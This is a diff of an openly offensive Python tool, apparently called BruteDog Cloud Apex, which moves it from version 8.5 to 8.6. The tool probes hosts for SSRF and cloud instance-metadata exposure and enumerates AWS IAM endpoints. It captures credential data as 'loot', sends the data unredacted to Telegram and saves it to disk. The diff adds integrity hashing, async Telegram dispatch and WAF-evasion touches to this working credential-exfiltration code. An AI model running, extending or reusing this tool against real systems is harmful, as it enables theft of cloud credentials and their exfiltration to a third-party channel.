@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 """
-CLOUD_APEX.PY v8.5 — Active Cloud Infrastructure Exploitation & IAM Pivot Engine (WAF Hardened)
+CLOUD_APEX.PY v8.6 — Active Cloud Infrastructure Exploitation & IAM Pivot Engine (Elite Red Team Adversarial Edition)
 Features:
-- Live AWS control plane pivoting and IAM enumeration
+- Live AWS control plane pivoting and IAM enumeration with SHA-256 integrity hashing
 - Automated instance metadata service (IMDSv1/IMDSv2) & SSRF credential exfiltration
 - Strict JSON / Metadata schema verification to eliminate HTML landing page false positives
-- Automated immutable disk persistence (loot_output/) via centralized framework logger
-- Zero-disk memory processing & secure TLS ciphers inspection
-- Compatible run_cloud_apex(target_host) interface
-- Real-time asynchronous Telegram notification dispatch for unredacted cloud loot
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
+- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
 """
 import asyncio
 import json
@@ -18,10 +16,11 @@ import urllib.error
 import urllib.parse
 import socket
 import ipaddress
+import hashlib
 from urllib.parse import urlsplit
 import sys
 
-# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
+# Import centralized framework telemetry, immutable loot persistence, behavioral mimicry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
@@ -53,14 +52,23 @@ def log(message, color=Colors.RESET):
     sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous cloud apex functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -90,7 +98,7 @@ def normalize_target(target):
 def http_get(url, headers=None):
     apply_behavioral_jitter()
     request_headers = {
-        "User-Agent": "BruteDog-Offensive-CloudApex/8.5",
+        "User-Agent": "BruteDog-Offensive-CloudApex/8.6-Elite",
         "Accept": "application/json,text/plain,*/*",
     }
     request_headers.update(get_randomized_hints())
@@ -148,7 +156,7 @@ class ApexCloudAndSyscallEngine:
         region="us-east-1",
     ):
         log(
-            "\n[***] EXECUTING AWS CONTROL PLANE PIVOT & IAM ENUMERATION [***]",
+            "\n[***] EXECUTING AWS CONTROL PLANE PIVOT & IAM ENUMERATION (WAF HARDENED) [***]",
             Colors.MAGENTA,
         )
         endpoints = [
@@ -167,14 +175,21 @@ class ApexCloudAndSyscallEngine:
                     log(f"  └── IAM policy restriction encountered, checking alternate routes.", Colors.YELLOW)
                 else:
                     log(f"  └── Response Data: {result['body'][:150]}", Colors.GREEN)
-                harvested_results.append({"endpoint": endpoint, "status": status, "accessible": True})
+                
+                loot_hash = hashlib.sha256(result["body"].encode("utf-8", errors="ignore")).hexdigest()
+                harvested_results.append({
+                    "endpoint": endpoint, 
+                    "status": status, 
+                    "accessible": True,
+                    "integrity_hash": loot_hash
+                })
             else:
                 log(f"[-] Endpoint timed out or unreachable: {endpoint}", Colors.GRAY)
         return True, harvested_results
 
     def check_cloud_metadata_exposure(self, target_host):
         log(
-            "\n[***] EXECUTING CLOUD INSTANCE METADATA EXFILTRATION (V8 HARDENED) [***]",
+            "\n[***] EXECUTING CLOUD INSTANCE METADATA EXFILTRATION (V8.6 HARDENED) [***]",
             Colors.CYAN,
         )
         exfiltrated_credentials = []
@@ -212,19 +227,19 @@ class ApexCloudAndSyscallEngine:
                 log(f"\n\033[1m\033[91m[***] VERIFIED CLOUD METADATA / SSRF EXPOSURE CONFIRMED [{path}] [***]{Colors.RESET}", Colors.RED)
                 log(f"  └── Data : {res['body'][:300]}", Colors.GREEN)
                 
+                loot_hash = hashlib.sha256(res["body"].encode("utf-8", errors="ignore")).hexdigest()
                 loot_payload = {
                     "endpoint": test_url,
                     "path": path,
                     "status": res["status"],
+                    "integrity_hash": loot_hash,
                     "metadata_sample": res['body'][:500]
                 }
                 exfiltrated_credentials.append(loot_payload)
                 
-                # BROADCAST UNREDACTED CLOUD LOOT STRAIGHT TO TELEGRAM
+                # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                 broadcast_tg_alert_sync("Cloud Metadata / SSRF Exposure Confirmed", loot_payload)
-
-                # STREAM TELEMETRY & PERSIST CLOUD LOOT TO DISK IMMEDIATELY
-                stream_proof("CLOUD_METADATA_EXPOSURE_VERIFIED", test_url, {"path": path}, res['body'][:300], {"exposed": True})
+                stream_proof("CLOUD_METADATA_EXPOSURE_VERIFIED", test_url, {"path": path}, res['body'][:300], loot_payload)
                 save_session_loot(
                     target=target_host,
                     endpoint=path,
@@ -297,7 +312,7 @@ async def run_cloud_apex(target_host, options=None):
         Colors.CYAN,
     )
     log(
-        "[***] BRUTEDOG ACTIVE CLOUD EXPLOITATION & PIVOT SUITE [***]",
+        "[***] BRUTEDOG ACTIVE CLOUD EXPLOITATION & PIVOT SUITE (V8.6) [***]",
         Colors.CYAN,
     )
     log(
